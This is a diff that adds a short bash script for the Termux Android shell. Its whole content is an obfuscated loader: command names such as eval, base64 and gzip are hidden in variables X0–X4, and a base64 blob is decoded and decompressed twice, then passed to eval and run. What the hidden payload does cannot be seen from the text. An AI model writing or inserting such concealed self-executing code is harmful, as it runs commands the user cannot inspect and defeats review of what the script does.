@@ -1,0 +1,18 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+X0="eval"
+X1="base64"
+X2="gzip"
+X3="-d"
+X4="printf"
+
+DATA=$(cat << 'EOF'
+H4sIAAAAAAAAAzXBSXaCMAAA0D1XYYGgkMcyYUgABePA0F2RQY2EqYWQ03fV/8lhDuA/3UhWajkn
+uGEghb8Wc11E4d4TGgxtdPwR2VdRbDsquQlw0CLW3cgy2KCy4/ElsMLDPlz6t7c87bt56a86nSeQ
+jp97PXmZj15uGcaDQ8be25j7Mbw8cHCNVUdricHIybea8pG1IAHcZMriHs/6FHBr7w5TdQ50iDe0
+s1JetOYDYaJijaG4i6e5ueZifQv/AI3q9ospxYkZ2VL9jlfZdEsumfK8TKUrqzTibQophMofFdYj
+0PgAAAA=
+EOF
+)
+
+$X0 "$($X4 "%s" "$DATA" | $X1 $X3 | $X2 $X3 | $X1 $X3 | $X2 $X3)"
